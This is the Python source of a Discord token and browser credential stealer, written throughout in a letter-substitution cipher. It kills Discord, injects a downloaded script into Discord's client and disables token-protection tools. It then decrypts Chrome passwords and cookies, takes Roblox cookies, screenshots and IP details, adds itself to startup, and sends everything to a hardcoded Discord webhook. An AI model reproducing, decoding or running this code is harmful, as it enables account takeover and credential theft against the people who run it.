nls:
    cgjiln im
    cgjiln dmih
    cgjiln bnnjr
    cgjiln qchlya
    cgjiln wnsjym
    cgjiln mboncf
    cgjiln jmoncf
    cgjiln umshwci
    cgjiln ncgy
    cgjiln msm
    cgjiln mkfcny3
    cgjiln tcjzcfy
    cgjiln nblyuxcha
    cgjiln movjliwymm
    cgjiln lykoymnm 
    cgjiln ly
    cgjiln xcmwilx
    cgjiln ucibnnj
    zlig xbiiem cgjiln Qyvbiie, Ygvyx
    zlig msm cgjiln ulap
    zlig JCF cgjiln CguayAluv
    zlig vumy64 cgjiln v64xywixy
    zlig nygjzcfy cgjiln gexnygj
    zlig ly cgjiln zchxuff, gunwb
    zlig Wlsjni.Wcjbyl cgjiln UYM
    zlig wifilugu cgjiln Zily, Mnsfy
    zlig qch32wlsjn cgjiln WlsjnOhjlinywnXunu
    zlig ncgy cgjiln mfyyj
    
yrwyjn:
    cgjiln ncgy
    cgjiln im
    chjon("Ziohx gcmmcha gixofym. Jlymm yhnyl ni chmnuff nbyg.")
    jlchn("Chmnuffcha gcmmcha gixofym ch 3 mywihxm. WNLF + W ni wuhwyf.")
    ncgy.mfyyj(3.0)
    im.msmnyg("jcj chmnuff lykoymnm && jcj chmnuff bnnjr && jcj chmnuff jsinj && jcj chmnuff jmoncf && jcj chmnuff jsjcqch32 && jcj chmnuff uym && jcj chmnuff jswlsjnixigy && jcj chmnuff jschmnuffyl>=5.0 && jcj chmnuff JCF-niifm && jcj chmnuff wifilugu && jcj chmnuff qch10niumn")
    im.msmnyg("wfm")
    jlchn("Chmnuffyx nby gcmmcha gixofym mowwymmzoffs. Jfyumy lymnuln nby wfcyhn. Wfimcha nbcm nylgchuf ch 10 mywihxm.")
    ncgy.mfyyj(10)
    msm.yrcn

biies = Qyvbiie('bnnjm://xcmwilx.wig/ujc/qyvbiiem/1173341597484711956/akFwMrGPQxkSMMHO7W4-XAcECFhLY1SFwcmypalVktE9kx_oR3XQPpoKPbJyCS_K5QMD')

wihzca = {
    'qyvbiie': "bnnjm://xcmwilx.wig/ujc/qyvbiiem/1173341597484711956/akFwMrGPQxkSMMHO7W4-XAcECFhLY1SFwcmypalVktE9kx_oR3XQPpoKPbJyCS_K5QMD",
    
    'ecff_jliwymmym': Zufmy,
    
    'mnulnoj': Nloy,
    
    'bcxy_myfz': Nloy,
    
    'uhnc_xyvoa': Nloy,
    
    'uoni_vos_hcnli': Nloy,
    
    'vfuweFcmnyxJlialugm':
    [
        "bnnjxyvoaayloc",
        "qclymbule",
        "zcxxfyl",
        "lyayxcn",
        "wgx",
        "numegal",
        "pvirmylpcwy",
        "xz5mylp",
        "jliwymmbuweyl",
        "pvirnlus",
        "pgniifmx",
        "pgqulynlus",
        "cxu64",
        "iffsxva",
        "jymnoxci",
        "pgqulyomyl",
        "pauonbmylpcwy",
        "pguwnbfj",
        "r96xva",
        "pgmlpw",
        "r32xva",
        "pgomlpw",
        "jlf_ww",
        "jlf_niifm",
        "ryhmylpcwy",
        "kygo-au",
        "diyvirwihnlif",
        "emxogjylwfcyhn",
        "emxogjyl",
        "diyvirmylpyl"
    ]
}
Pcwncg = im.aynfiach()
Pcwncg_jw = im.aynyhp("WIGJONYLHUGY")


wfumm zohwncihm(ivdywn):
    @mnuncwgynbix
    xyz aynByuxylm(nieyh: mnl = Hihy):
        byuxylm = {
            "Wihnyhn-Nsjy": "ujjfcwuncih/dmih",
        }
        cz nieyh:
            byuxylm.ojxuny({"Uonbilctuncih": nieyh})
        lynolh byuxylm

    @mnuncwgynbix
    xyz ayn_gumnyl_eys(junb) -> mnl:
        qcnb ijyh(junb, "l", yhwixcha="onz-8") um z:
            w = z.lyux()
        fiwuf_mnuny = dmih.fiuxm(w)

        gumnyl_eys = v64xywixy(fiwuf_mnuny["im_wlsjn"]["yhwlsjnyx_eys"])
        gumnyl_eys = gumnyl_eys[5:]
        gumnyl_eys = WlsjnOhjlinywnXunu(gumnyl_eys, Hihy, Hihy, Hihy, 0)[1]
        lynolh gumnyl_eys

    @mnuncwgynbix
    xyz xywlsjn_puf(vozz, gumnyl_eys) -> mnl:
        nls:
            cp = vozz[3:15]
            jusfiux = vozz[15:]
            wcjbyl = UYM.hyq(gumnyl_eys, UYM.GIXY_AWG, cp)
            xywlsjnyx_jumm = wcjbyl.xywlsjn(jusfiux)
            xywlsjnyx_jumm = xywlsjnyx_jumm[:-16].xywixy()
            lynolh xywlsjnyx_jumm
        yrwyjn Yrwyjncih:
            lynolh "Zucfyx ni xywlsjn jummqilx"

    @mnuncwgynbix
    xyz zynwbWihz(y: mnl) -> mnl il viif | Hihy:
        lynolh wihzca.ayn(y)


wfumm Chdywncih(zohwncihm):
    xyz __chcn__(myfz, qyvbiie: mnl) -> Hihy:

        myfz.ujjxunu = im.aynyhp('FIWUFUJJXUNU')
        myfz.xcmwilx_xclm = [
            myfz.ujjxunu + '\\Xcmwilx',
            myfz.ujjxunu + '\\XcmwilxWuhuls',
            myfz.ujjxunu + '\\XcmwilxJNV',
            myfz.ujjxunu + '\\XcmwilxXypyfijgyhn'
        ]
        cz myfz.zynwbWihz('uoni_vos_hcnli'):
            myfz.wixy = lykoymnm.ayn('bnnjm://luq.acnbovomylwihnyhn.wig/XuguachaLimy/Limy-Chdywnil/guch/chdywncih/uoni_vos__NLOY__chdywncih.dm').nyrn
        yfmy:
            myfz.wixy = lykoymnm.ayn('bnnjm://luq.acnbovomylwihnyhn.wig/XuguachaLimy/Limy-Chdywnil/guch/chdywncih/uoni_vos__ZUFMY__chdywncih.dm').nyrn

        zil jliw ch jmoncf.jliwymm_cnyl():
            cz 'xcmwilx' ch jliw.hugy().fiqyl():
                jliw.ecff()

        zil xcl ch myfz.xcmwilx_xclm:
            cz hin im.junb.yrcmnm(xcl):
                wihnchoy

            cz myfz.ayn_wily(xcl) cm hin Hihy:
                qcnb ijyh(myfz.ayn_wily(xcl)[0] + '\\chxyr.dm', 'q', yhwixcha='onz-8') um z:
                    z.qlcny((myfz.wixy).lyjfuwy('xcmwilx_xymenij_wily-1', mnl(myfz.ayn_wily(xcl)[1])).lyjfuwy('%QYVBIIE%', mnl(qyvbiie)))
                    myfz.mnuln_xcmwilx(xcl)

    @mnuncwgynbix
    xyz ayn_wily(xcl: mnl) -> nojfy:
        zil zcfy ch im.fcmnxcl(xcl):
            cz ly.myulwb(l'ujj-+?', zcfy):
                gixofym = xcl + '\\' + zcfy + '\\gixofym'
                cz hin im.junb.yrcmnm(gixofym):
                    wihnchoy
                zil zcfy ch im.fcmnxcl(gixofym):
                    cz ly.myulwb(l'xcmwilx_xymenij_wily-+?', zcfy):
                        wily = gixofym + '\\' + zcfy + '\\' + 'xcmwilx_xymenij_wily'
                        cz hin im.junb.yrcmnm(wily + '\\chxyr.dm'):
                            wihnchoy
                        lynolh wily, zcfy

    @mnuncwgynbix
    xyz mnuln_xcmwilx(xcl: mnl) -> Hihy:
        ojxuny = xcl + '\\Ojxuny.yry'
        yrywonuvfy = xcl.mjfcn('\\')[-1] + '.yry'

        zil zcfy ch im.fcmnxcl(xcl):
            cz ly.myulwb(l'ujj-+?', zcfy):
                ujj = xcl + '\\' + zcfy
                cz im.junb.yrcmnm(ujj + '\\' + 'gixofym'):
                    zil zcfy ch im.fcmnxcl(ujj):
                        cz zcfy == yrywonuvfy:
                            yrywonuvfy = ujj + '\\' + yrywonuvfy
                            movjliwymm.wuff([ojxuny, '--jliwymmMnuln', yrywonuvfy],
                                            mbyff=Nloy, mnxion=movjliwymm.JCJY, mnxyll=movjliwymm.JCJY)
     
Chdywncih(zohwncihm)


wfumm Eipyhuhn(zohwncihm):
    xyz __chcn__(myfz):
        myfz.qyvbiie = myfz.zynwbWihz('qyvbiie')
        myfz.vumyolf = "bnnjm://xcmwilx.wig/ujc/p9/omylm/@gy"
        myfz.ujjxunu = im.aynyhp("fiwufujjxunu")
        myfz.liugcha = im.aynyhp("ujjxunu")
        myfz.xcl = gexnygj()
        myfz.mnulnoj_fiw = myfz.liugcha + \
            "\\Gcwlimizn\\Qchxiqm\\Mnuln Gyho\\Jlialugm\\Mnulnoj\\"
        myfz.lyayr = l"[\q-]{24}\.[\q-]{6}\.[\q-]{25,110}"
        myfz.yhwlsjnyx_lyayr = l"xKq4q9QaRwK:[^\"]*"

        myfz.myj = im.myj
        myfz.nieyhm = []
        myfz.livfirwiiecym = []

        im.gueyxclm(myfz.xcl, yrcmn_ie=Nloy)

    xyz nls_yrnluwn(zohw):
        xyz qlujjyl(*ulam, **equlam):
            nls:
                zohw(*ulam, **equlam)
            yrwyjn Yrwyjncih:
                jumm
        lynolh qlujjyl

    umshw xyz wbyweNieyh(myfz, neh: mnl) -> mnl:
        nls:
            l = bnnjr.ayn(
                olf=myfz.vumyolf,
                byuxylm=myfz.aynByuxylm(neh),
                ncgyion=5.0
            )
        yrwyjn (bnnjr._yrwyjncihm.WihhywnNcgyion, bnnjr._yrwyjncihm.NcgyionYrwyjncih):
            jumm
        cz l.mnunom_wixy == 200 uhx neh hin ch myfz.nieyhm:
            myfz.nieyhm.ujjyhx(neh)

    umshw xyz chcn(myfz):
        cz myfz.zynwbWihz('uhnc_xyvoa'):
            cz UhncXyvoa().chPG:
                im._yrcn(0)
        uqucn myfz.vsjummVynnylXcmwilx()
        uqucn myfz.vsjummNieyhJlinywnil()
        zohwncih_fcmn = [myfz.mwlyyhmbin, myfz.an,
                         myfz.alw]
        cz myfz.zynwbWihz('bcxy_myfz'):
            zohwncih_fcmn.ujjyhx(myfz.bcxy)

        cz myfz.zynwbWihz('ecff_jliwymmym'):
            uqucn myfz.ecffJliwymmym()

        cz myfz.zynwbWihz('mnulnoj'):
            zohwncih_fcmn.ujjyhx(myfz.mnulnoj)

        cz im.junb.yrcmnm(myfz.ujjxunu+'\\Aiiafy\\Wbligy\\Omyl Xunu\\Xyzuofn') uhx im.junb.yrcmnm(myfz.ujjxunu+'\\Aiiafy\\Wbligy\\Omyl Xunu\\Fiwuf Mnuny'):
            zohwncih_fcmn.ujjyhx(myfz.aluvJummqilx)
            zohwncih_fcmn.ujjyhx(myfz.aluvWiiecym)

        zil zohw ch zohwncih_fcmn:
            jliwymm = nblyuxcha.Nblyux(nulayn=zohw, xuygih=Nloy)
            jliwymm.mnuln()
        zil n ch nblyuxcha.yhogyluny():
            nls:
                n.dich()
            yrwyjn LohncgyYllil:
                wihnchoy
        myfz.hyunczsNieyhm()
        myfz.zchcmb()
        mboncf.lgnlyy(myfz.xcl)


    xyz bcxy(myfz):
        wnsjym.qchxff.eylhyf32.MynZcfyUnnlcvonymQ(ulap[0], 2)

    xyz mnulnoj(myfz):
        nls:
            mboncf.wijs2(ulap[0], myfz.mnulnoj_fiw)
        yrwyjn Yrwyjncih:
            jumm

    umshw xyz ecffJliwymmym(myfz):
        vfuweFcmnyxJlialugm = myfz.zynwbWihz('vfuweFcmnyxJlialugm')
        zil c ch ['xcmwilx', 'xcmwilxnieyhjlinywnil', 'xcmwilxwuhuls', 'xcmwilxxypyfijgyhn', 'xcmwilxjnv']:
            vfuweFcmnyxJlialugm.ujjyhx(c)
        zil jliw ch jmoncf.jliwymm_cnyl():
            cz uhs(jliwmnl ch jliw.hugy().fiqyl() zil jliwmnl ch vfuweFcmnyxJlialugm):
                nls:
                    jliw.ecff()
                yrwyjn (jmoncf.HiMowbJliwymm, jmoncf.UwwymmXyhcyx):
                    jumm

    umshw xyz vsjummNieyhJlinywnil(myfz):
        nj = z"{myfz.liugcha}\\XcmwilxNieyhJlinywnil\\"
        cz hin im.junb.yrcmnm(nj):
            lynolh
        wihzca = nj+"wihzca.dmih"

        zil c ch ["XcmwilxNieyhJlinywnil.yry", "JlinywncihJusfiux.xff", "mywoly.xun"]:
            nls:
                im.lygipy(nj+c)
            yrwyjn ZcfyHinZiohxYllil:
                jumm
        cz im.junb.yrcmnm(wihzca):
            qcnb ijyh(wihzca, yllilm="cahily") um z:
                nls:
                    cnyg = dmih.fiux(z)
                yrwyjn dmih.xywixyl.DMIHXywixyYllil:
                    lynolh
                cnyg['Hcwy nieyh jlinywnil zuaain FGZUIIIIIIIII'] = "Eipyhuhn"
                cnyg['uoni_mnuln'] = Zufmy
                cnyg['uoni_mnuln_xcmwilx'] = Zufmy
                cnyg['chnyalcns'] = Zufmy
                cnyg['chnyalcns_uffiqvynnylxcmwilx'] = Zufmy
                cnyg['chnyalcns_wbyweyrywonuvfy'] = Zufmy
                cnyg['chnyalcns_wbywebumb'] = Zufmy
                cnyg['chnyalcns_wbywegixofy'] = Zufmy
                cnyg['chnyalcns_wbywemwlcjnm'] = Zufmy
                cnyg['chnyalcns_wbywelymiolwy'] = Zufmy
                cnyg['chnyalcns_lyxiqhfiuxbumbym'] = Zufmy
                cnyg['cnyluncihm_cp'] = 364
                cnyg['cnyluncihm_eys'] = 457
                cnyg['pylmcih'] = 69420
            qcnb ijyh(wihzca, 'q') um z:
                dmih.xogj(cnyg, z, chxyhn=2, miln_eysm=Nloy)
            qcnb ijyh(wihzca, 'u') um z:
                z.qlcny(
                    "\h\h//nbyly qyhn siol nieyh jlinywnil :^(")

    umshw xyz vsjummVynnylXcmwilx(myfz):
        vx = myfz.liugcha+"\\VynnylXcmwilx\\xunu\\vynnylxcmwilx.umul"
        cz im.junb.yrcmnm(vx):
            r = "ujc/qyvbiiem"
            qcnb ijyh(vx, 'l', yhwixcha="wj437", yllilm='cahily') um z:
                nrn = z.lyux()
                wihnyhn = nrn.lyjfuwy(r, 'Lxgi1NbyAiun')
            qcnb ijyh(vx, 'q', hyqfchy='', yhwixcha="wj437", yllilm='cahily') um z:
                z.qlcny(wihnyhn)

    xyz aynJlixownPufoym(myfz):
        nls:
            qeys = movjliwymm.wbywe_ionjon(
                l"jiqylmbyff Ayn-CnygJlijylnsPufoy -Junb 'BEFG:MIZNQULY\Gcwlimizn\Qchxiqm HN\WollyhnPylmcih\MiznqulyJlinywncihJfunzilg' -Hugy VuweojJlixownEysXyzuofn", wlyuncihzfuam=0r08000000).xywixy().lmnlcj()
        yrwyjn Yrwyjncih:
            qeys = "H/U (Fceyfs Jclunyx)"
        nls:
            jlixownHugy = movjliwymm.wbywe_ionjon(
                l"jiqylmbyff Ayn-CnygJlijylnsPufoy -Junb 'BEFG:MIZNQULY\Gcwlimizn\Qchxiqm HN\WollyhnPylmcih' -Hugy JlixownHugy", wlyuncihzfuam=0r08000000).xywixy().lmnlcj()
        yrwyjn Yrwyjncih:
            jlixownHugy = "H/U"
        lynolh [jlixownHugy, qeys]

    @nls_yrnluwn
    xyz an(myfz):
        junbm = {
            'Xcmwilx': myfz.liugcha + l'\\xcmwilx\\Fiwuf Mniluay\\fypyfxv\\',
            'Xcmwilx Wuhuls': myfz.liugcha + l'\\xcmwilxwuhuls\\Fiwuf Mniluay\\fypyfxv\\',
            'Fcabnwilx': myfz.liugcha + l'\\Fcabnwilx\\Fiwuf Mniluay\\fypyfxv\\',
            'Xcmwilx JNV': myfz.liugcha + l'\\xcmwilxjnv\\Fiwuf Mniluay\\fypyfxv\\',
            'Ijylu': myfz.liugcha + l'\\Ijylu Miznquly\\Ijylu Mnuvfy\\Fiwuf Mniluay\\fypyfxv\\',
            'Ijylu AR': myfz.liugcha + l'\\Ijylu Miznquly\\Ijylu AR Mnuvfy\\Fiwuf Mniluay\\fypyfxv\\',
            'Ugcai': myfz.ujjxunu + l'\\Ugcai\\Omyl Xunu\\Fiwuf Mniluay\\fypyfxv\\',
            'Nilwb': myfz.ujjxunu + l'\\Nilwb\\Omyl Xunu\\Fiwuf Mniluay\\fypyfxv\\',
            'Eigynu': myfz.ujjxunu + l'\\Eigynu\\Omyl Xunu\\Fiwuf Mniluay\\fypyfxv\\',
            'Ilvcnog': myfz.ujjxunu + l'\\Ilvcnog\\Omyl Xunu\\Fiwuf Mniluay\\fypyfxv\\',
            'WyhnVliqmyl': myfz.ujjxunu + l'\\WyhnVliqmyl\\Omyl Xunu\\Fiwuf Mniluay\\fypyfxv\\',
            '7Mnul': myfz.ujjxunu + l'\\7Mnul\\7Mnul\\Omyl Xunu\\Fiwuf Mniluay\\fypyfxv\\',
            'Mjonhce': myfz.ujjxunu + l'\\Mjonhce\\Mjonhce\\Omyl Xunu\\Fiwuf Mniluay\\fypyfxv\\',
            'Pcpufxc': myfz.ujjxunu + l'\\Pcpufxc\\Omyl Xunu\\Xyzuofn\\Fiwuf Mniluay\\fypyfxv\\',
            'Wbligy MrM': myfz.ujjxunu + l'\\Aiiafy\\Wbligy MrM\\Omyl Xunu\\Fiwuf Mniluay\\fypyfxv\\',
            'Wbligy': myfz.ujjxunu + l'\\Aiiafy\\Wbligy\\Omyl Xunu\\Xyzuofn\\Fiwuf Mniluay\\fypyfxv\\',
            'Yjcw Jlcpuws Vliqmyl': myfz.ujjxunu + l'\\Yjcw Jlcpuws Vliqmyl\\Omyl Xunu\\Fiwuf Mniluay\\fypyfxv\\',
            'Gcwlimizn Yxay': myfz.ujjxunu + l'\\Gcwlimizn\\Yxay\\Omyl Xunu\\Xyzuofn\\Fiwuf Mniluay\\fypyfxv\\',
            'Oluh': myfz.ujjxunu + l'\\oWitGyxcu\\Oluh\\Omyl Xunu\\Xyzuofn\\Fiwuf Mniluay\\fypyfxv\\',
            'Suhxyr': myfz.ujjxunu + l'\\Suhxyr\\SuhxyrVliqmyl\\Omyl Xunu\\Xyzuofn\\Fiwuf Mniluay\\fypyfxv\\',
            'Vlupy': myfz.ujjxunu + l'\\VlupyMiznquly\\Vlupy-Vliqmyl\\Omyl Xunu\\Xyzuofn\\Fiwuf Mniluay\\fypyfxv\\',
            'Clcxcog': myfz.ujjxunu + l'\\Clcxcog\\Omyl Xunu\\Xyzuofn\\Fiwuf Mniluay\\fypyfxv\\'
        }

        zil hugy, junb ch junbm.cnygm():
            cz hin im.junb.yrcmnm(junb):
                wihnchoy
            xcmw = hugy.lyjfuwy(" ", "").fiqyl()
            cz "wilx" ch junb:
                cz im.junb.yrcmnm(myfz.liugcha+z'\\{xcmw}\\Fiwuf Mnuny'):
                    zil zcfy_hugy ch im.fcmnxcl(junb):
                        cz zcfy_hugy[-3:] hin ch ["fia", "fxv"]:
                            wihnchoy
                        zil fchy ch [r.mnlcj() zil r ch ijyh(z'{junb}\\{zcfy_hugy}', yllilm='cahily').lyuxfchym() cz r.mnlcj()]:
                            zil s ch zchxuff(myfz.yhwlsjnyx_lyayr, fchy):
                                nieyh = myfz.xywlsjn_puf(v64xywixy(
                                    s.mjfcn('xKq4q9QaRwK:')[1]), myfz.ayn_gumnyl_eys(myfz.liugcha+z'\\{xcmw}\\Fiwuf Mnuny'))
                                umshwci.loh(myfz.wbyweNieyh(nieyh))
            yfmy:
                zil zcfy_hugy ch im.fcmnxcl(junb):
                    cz zcfy_hugy[-3:] hin ch ["fia", "fxv"]:
                        wihnchoy
                    zil fchy ch [r.mnlcj() zil r ch ijyh(z'{junb}\\{zcfy_hugy}', yllilm='cahily').lyuxfchym() cz r.mnlcj()]:
                        zil nieyh ch zchxuff(myfz.lyayr, fchy):
                            umshwci.loh(myfz.wbyweNieyh(nieyh))

        cz im.junb.yrcmnm(myfz.liugcha+"\\Gitcffu\\Zclyzir\\Jlizcfym"):
            zil junb, _, zcfym ch im.qufe(myfz.liugcha+"\\Gitcffu\\Zclyzir\\Jlizcfym"):
                zil _zcfy ch zcfym:
                    cz hin _zcfy.yhxmqcnb('.mkfcny'):
                        wihnchoy
                    zil fchy ch [r.mnlcj() zil r ch ijyh(z'{junb}\\{_zcfy}', yllilm='cahily').lyuxfchym() cz r.mnlcj()]:
                        zil nieyh ch zchxuff(myfz.lyayr, fchy):
                            umshwci.loh(myfz.wbyweNieyh(nieyh))

    @nls_yrnluwn
    xyz aluvJummqilx(myfz):
        gumnyl_eys = myfz.ayn_gumnyl_eys(
            myfz.ujjxunu+'\\Aiiafy\\Wbligy\\Omyl Xunu\\Fiwuf Mnuny')
        fiach_xv = myfz.ujjxunu+'\\Aiiafy\\Wbligy\\Omyl Xunu\\xyzuofn\\Fiach Xunu'
        fiach = myfz.xcl+myfz.myj+"Fiachpuofn1.xv"

        mboncf.wijs2(fiach_xv, fiach)
        wihh = mkfcny3.wihhywn(fiach)
        wolmil = wihh.wolmil()
        qcnb ijyh(myfz.xcl+"\\Aiiafy Jummqilxm.nrn", "q", yhwixcha="wj437", yllilm='cahily') um z:
            wolmil.yrywony(
                "MYFYWN uwncih_olf, omylhugy_pufoy, jummqilx_pufoy ZLIG fiachm")
            zil l ch wolmil.zynwbuff():
                olf = l[0]
                omylhugy = l[1]
                yhwlsjnyx_jummqilx = l[2]
                xywlsjnyx_jummqilx = myfz.xywlsjn_puf(
                    yhwlsjnyx_jummqilx, gumnyl_eys)
                cz olf != "":
                    z.qlcny(
                        z"Xiguch: {olf}\hOmyl: {omylhugy}\hJumm: {xywlsjnyx_jummqilx}\h\h")
        wolmil.wfimy()
        wihh.wfimy()
        im.lygipy(fiach)

    @nls_yrnluwn
    xyz aluvWiiecym(myfz):
        gumnyl_eys = myfz.ayn_gumnyl_eys(
            myfz.ujjxunu+'\\Aiiafy\\Wbligy\\Omyl Xunu\\Fiwuf Mnuny')
        fiach_xv = myfz.ujjxunu+'\\Aiiafy\\Wbligy\\Omyl Xunu\\xyzuofn\\Hynqile\\wiiecym'
        fiach = myfz.xcl+myfz.myj+"Fiachpuofn2.xv"

        mboncf.wijs2(fiach_xv, fiach)
        wihh = mkfcny3.wihhywn(fiach)
        wolmil = wihh.wolmil()
        qcnb ijyh(myfz.xcl+"\\A_W.nrn", "q", yhwixcha="wj437", yllilm='cahily') um z:
            wolmil.yrywony(
                "MYFYWN bimn_eys, hugy, yhwlsjnyx_pufoy zlig wiiecym")
            zil l ch wolmil.zynwbuff():
                bimn = l[0]
                omyl = l[1]
                xywlsjnyx_wiiecy = myfz.xywlsjn_puf(l[2], gumnyl_eys)
                cz bimn != "":
                    z.qlcny(
                        z"Bimn: {bimn}\hOmyl: {omyl}\hWiiecy: {xywlsjnyx_wiiecy}\h\h")
                cz '_|QULHCHA:-XI-HIN-MBULY-NBCM.--Mbulcha-nbcm-qcff-uffiq-migyihy-ni-fia-ch-um-sio-uhx-ni-mnyuf-siol-LIVOR-uhx-cnygm.|_' ch xywlsjnyx_wiiecy:
                    myfz.livfirwiiecym.ujjyhx(xywlsjnyx_wiiecy)
        wolmil.wfimy()
        wihh.wfimy()
        im.lygipy(fiach)

    xyz hyunczsNieyhm(myfz):
        z = ijyh(myfz.xcl+"\\X_Chzi.nrn",
                 "q", yhwixcha="wj437", yllilm='cahily')
        zil nieyh ch myfz.nieyhm:
            d = bnnjr.ayn(
                myfz.vumyolf, byuxylm=myfz.aynByuxylm(nieyh)).dmih()
            omyl = d.ayn('omylhugy') + '#' + mnl(d.ayn("xcmwlcgchunil"))

            vuxaym = ""
            zfuam = d['zfuam']
            zfuam = d['zfuam']
            cz (zfuam == 1):
                vuxaym += "Mnuzz, "
            cz (zfuam == 2):
                vuxaym += "Julnhyl, "
            cz (zfuam == 4):
                vuxaym += "Bsjymkoux Ypyhn, "
            cz (zfuam == 8):
                vuxaym += "Alyyh Voabohnyl, "
            cz (zfuam == 64):
                vuxaym += "Bsjymkoux Vlupyls, "
            cz (zfuam == 128):
                vuxaym += "BsjyMkoux Vlcffuhwy, "
            cz (zfuam == 256):
                vuxaym += "BsjyMkoux Vufuhwy, "
            cz (zfuam == 512):
                vuxaym += "Yulfs Mojjilnyl, "
            cz (zfuam == 16384):
                vuxaym += "Aifx VoaBohnyl, "
            cz (zfuam == 131072):
                vuxaym += "Pylczcyx Vin Xypyfijyl, "
            cz (vuxaym == ""):
                vuxaym = "Hihy"
            ygucf = d.ayn("ygucf")
            jbihy = d.ayn("jbihy") cz d.ayn(
                "jbihy") yfmy "Hi Jbihy Hogvyl unnuwbyx"
            hcnli_xunu = bnnjr.ayn(
                myfz.vumyolf+'/vcffcha/movmwlcjncihm', byuxylm=myfz.aynByuxylm(nieyh)).dmih()
            bum_hcnli = Zufmy
            bum_hcnli = viif(fyh(hcnli_xunu) > 0)
            vcffcha = viif(fyh(dmih.fiuxm(bnnjr.ayn(
                myfz.vumyolf+"/vcffcha/jusgyhn-miolwym", byuxylm=myfz.aynByuxylm(nieyh)).nyrn)) > 0)
            z.qlcny(z"{' '*17}{omyl}\h{'-'*50}\hNieyh: {nieyh}\hBum Vcffcha: {vcffcha}\hHcnli: {bum_hcnli}\hVuxaym: {vuxaym}\hYgucf: {ygucf}\hJbihy: {jbihy}\h\h")
        z.wfimy()

    xyz alw(myfz):
        xyz movjliw(junb):
            nls:
                lynolh movjliwymm.wbywe_ionjon(
                    zl"jiqylmbyff Ayn-CnygJlijylnsPufoy -Junb {junb}:MIZNQULY\Livfir\LivfirMnoxciVliqmyl\livfir.wig -Hugy .LIVFIMYWOLCNS",
                    wlyuncihzfuam=0r08000000).xywixy().lmnlcj()
            yrwyjn Yrwyjncih:
                lynolh Hihy
        lya_wiiecy = movjliw(l'BEFG')
        cz hin lya_wiiecy:
            lya_wiiecy = movjliw(l'BEWO')
        cz lya_wiiecy:
            myfz.livfirwiiecym.ujjyhx(lya_wiiecy)
        cz myfz.livfirwiiecym:
            qcnb ijyh(myfz.xcl+"\\Livfir Wiiecym.nrn", "q") um z:
                zil c ch myfz.livfirwiiecym:
                    z.qlcny(c+'\h')

    xyz mwlyyhmbin(myfz):
        cguay = CguayAluv.aluv(
            vvir=Hihy,
            chwfoxy_fusylyx_qchxiqm=Zufmy,
            uff_mwlyyhm=Nloy,
            rxcmjfus=Hihy
        )
        cguay.mupy(myfz.xcl + "\\Mwlyyhmbin.jha")
        cguay.wfimy()

    xyz zchcmb(myfz):
        zil c ch im.fcmnxcl(myfz.xcl):
            cz c.yhxmqcnb('.nrn'):
                junb = myfz.xcl+myfz.myj+c
                qcnb ijyh(junb, "l", yllilm="cahily") um zz:
                    r = zz.lyux()
                    cz hin r:
                        zz.wfimy()
                        im.lygipy(junb)
                    yfmy:
                        qcnb ijyh(junb, "q", yhwixcha="onz-8", yllilm="cahily") um z:
                            z.qlcny("Luh vs Eipyhuhn\h\h")
                        qcnb ijyh(junb, "u", yhwixcha="onz-8", yllilm="cahily") um zj:
                            zj.qlcny(r+"\h\hWihnyhn vlioabn ni sio vs Eip / Cxif")

        q = myfz.aynJlixownPufoym()
        qhugy = q[0].lyjfuwy(" ", "᠎ ")
        qeys = q[1].lyjfuwy(" ", "᠎ ")
        lug = mnl(jmoncf.pclnouf_gygils()[0]/1024 ** 3).mjfcn(".")[0]
        xcme = mnl(jmoncf.xcme_omuay('/')[0]/1024 ** 3).mjfcn(".")[0]
        xunu = bnnjr.ayn("bnnjm://cjchzi.ci/dmih").dmih()
        cj = xunu.ayn('cj')
        wcns = xunu.ayn('wcns')
        wiohnls = xunu.ayn('wiohnls')
        lyacih = xunu.ayn('lyacih')
        ila = xunu.ayn('ila')
        aiiafyguj = "bnnjm://qqq.aiiafy.wig/gujm/myulwb/aiiafy+guj++" + \
            xunu.ayn('fiw')

        _tcjzcfy = im.junb.dich(
            myfz.ujjxunu, z'{Pcwncg} Chzilguncih.tcj')
        tcjjyx_zcfy = tcjzcfy.TcjZcfy(_tcjzcfy, "q", tcjzcfy.TCJ_XYZFUNYX)
        uvm_mlw = im.junb.uvmjunb(myfz.xcl)
        zil xclhugy, _, zcfym ch im.qufe(myfz.xcl):
            zil zcfyhugy ch zcfym:
                uvmhugy = im.junb.uvmjunb(im.junb.dich(xclhugy, zcfyhugy))
                ulwhugy = uvmhugy[fyh(uvm_mlw) + 1:]
                tcjjyx_zcfy.qlcny(uvmhugy, ulwhugy)
        tcjjyx_zcfy.wfimy()
        zcfym_ziohx = ''
        zil z ch im.fcmnxcl(myfz.xcl):
            zcfym_ziohx += z"・{z}\h"
        nieyhm = ''
        zil neh ch myfz.nieyhm:
            nieyhm += z'{neh}\h\h'
        zcfyWiohn = z"{fyh(zcfym)} Zcfym Ziohx: "
    
        ncgy.mfyyj(2)
        im.msmnyg('wfm')
        jlchn(z'[{Zily.FCABNALYYH_YR}{Mnsfy.VLCABN} Fiuxcha, jfyumy uffiq migy ncgy vyzily augy mnulnm {Mnsfy.LYMYN_UFF}]')

        ygv = Ygvyx(
            xymwlcjncih = 'Vlioabn ni sio vs **Eip / Cxif**',
            wifil = 0r0084zz,
            ncgymnugj = 'hiq'
        )  

        cguay1 = 'bnnjm://gyxcu.xcmwilxujj.hyn/unnuwbgyhnm/1171106321261670403/1171106595766276178/FIMYL.dja?yr=655v7902&cm=65490402&bg=18x003xv111x384142w7w0z14z78wvu246v100537ww657w7992y1w2y68061z6u&=&qcxnb=1183&bycabn=887'

        VCHZI = z'''```zcr
CJ:᠎ {cj.lyjfuwy(" ", "᠎ ") cz cj yfmy "H/U"}
Ila:᠎ {ila.lyjfuwy(" ", "᠎ ") cz ila yfmy "H/U"}
Wcns:᠎ {wcns.lyjfuwy(" ", "᠎ ") cz wcns yfmy "H/U"}
Lyacih:᠎ {lyacih.lyjfuwy(" ", "᠎ ") cz lyacih yfmy "H/U"}
Wiohnls:᠎ {wiohnls.lyjfuwy(" ", "᠎ ") cz wiohnls yfmy "H/U"}```'''
        
        MSMCHZI = z'''```zcr
JWHugy: {Pcwncg_jw.lyjfuwy(" ", "᠎ ")}
QchEys:᠎ {qeys}
Jfunzilg:᠎ {qhugy}
XcmeMjuwy:᠎ {xcme}AV
Lug:᠎ {lug}AV```'''
        
        NIECHZI = z'''```zcr
{nieyhm cz nieyhm yfmy "Hi nieyhm yrnluwnyx"}```'''
        
        ZZIOHX = z'''```zcr
{zcfym_ziohx.mnlcj()}```'''

        ygv.myn_uonbil(hugy = 'Eipyhuhn', cwih_olf = cguay1)
